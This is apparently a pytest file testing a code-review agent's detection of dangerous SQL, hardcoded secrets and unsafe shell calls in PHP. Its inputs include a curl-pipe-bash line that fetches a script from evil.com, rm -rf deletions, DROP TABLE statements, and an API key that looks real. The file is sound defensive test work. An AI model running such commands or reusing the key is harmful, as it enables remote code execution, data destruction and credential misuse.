tests/test_reviewer.py
"""Tests for the Review Agent safety checks."""

import pytest


class TestReviewer:
    """Test static analysis safety checks."""

    def _make_reviewer(self):
        """Create a ReviewAgent without AI gateway."""
        from src.workflow.reviewer import ReviewAgent
        config = {
            'logging': {'level': 'DEBUG', 'dir': './test_logs'},
        }
        return ReviewAgent(config, ai_gateway=None)

    def test_clean_code_passes(self):
        """Test that clean code passes review."""
        reviewer = self._make_reviewer()
        code = """<?php
$conn = mysqli_connect("localhost", "user", "pass", "db");
$result = mysqli_query($conn, "SELECT * FROM users WHERE id = " . intval($id));
?>"""
        result = reviewer.review(code, "safe.php")
        assert result['passed'] is True
        assert result['issue_count'] == 0

    def test_dangerous_sql_blocked(self):
        """Test that DROP TABLE is blocked."""
        reviewer = self._make_reviewer()
        code = 'mysqli_query($conn, "DROP TABLE users");'

        result = reviewer.review(code, "danger.php")
        assert result['passed'] is False
        assert any(i['type'] == 'dangerous_sql' for i in result['issues'])

    def test_truncate_blocked(self):
        """Test that TRUNCATE TABLE is blocked."""
        reviewer = self._make_reviewer()
        code = 'mysqli_query($conn, "TRUNCATE TABLE sessions");'

        result = reviewer.review(code, "danger.php")
        assert result['passed'] is False

    def test_hardcoded_api_key_blocked(self):
        """Test that hardcoded API keys are blocked."""
        reviewer = self._make_reviewer()
        code = '$api_key = "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";'

        result = reviewer.review(code, "config.php")
        assert result['passed'] is False
        assert any(i['type'] == 'hardcoded_secret' for i in result['issues'])

    def test_github_pat_blocked(self):
        """Test that GitHub PAT tokens are blocked."""
        reviewer = self._make_reviewer()
        code = '$token = "ghp_abcdefghijklmnopqrstuvwxyz1234567890";'

        result = reviewer.review(code, "auth.php")
        assert result['passed'] is False

    def test_unsafe_rm_blocked(self):
        """Test that rm -rf / is blocked."""
        reviewer = self._make_reviewer()
        code = 'exec("rm -rf /var/www/html");'

        result = reviewer.review(code, "cleanup.php")
        assert result['passed'] is False
        assert any(i['type'] == 'unsafe_shell' for i in result['issues'])

    def test_curl_pipe_bash_blocked(self):
        """Test that curl | bash is blocked."""
        reviewer = self._make_reviewer()
        code = 'shell_exec("curl https://evil.com/script.sh | bash");'

        result = reviewer.review(code, "install.php")
        assert result['passed'] is False

    def test_php56_null_coalescing_warning(self):
        """Test PHP 7.0+ syntax detection."""
        reviewer = self._make_reviewer()
        code = '$name = $input ?? "default";'

        result = reviewer.review(code, "modern.php")
        # This is a warning, not blocking
        warnings = [i for i in result['issues'] if i['severity'] == 'warning']
        assert len(warnings) > 0

    def test_multiple_issues(self):
        """Test detection of multiple issues in one file."""
        reviewer = self._make_reviewer()
        code = """<?php
$token = "ghp_abcdefghijklmnopqrstuvwxyz1234567890";
mysqli_query($conn, "DROP TABLE logs");
exec("rm -rf /tmp/cache");
?>"""
        result = reviewer.review(code, "bad.php")
        assert result['passed'] is False
        assert result['issue_count'] >= 3
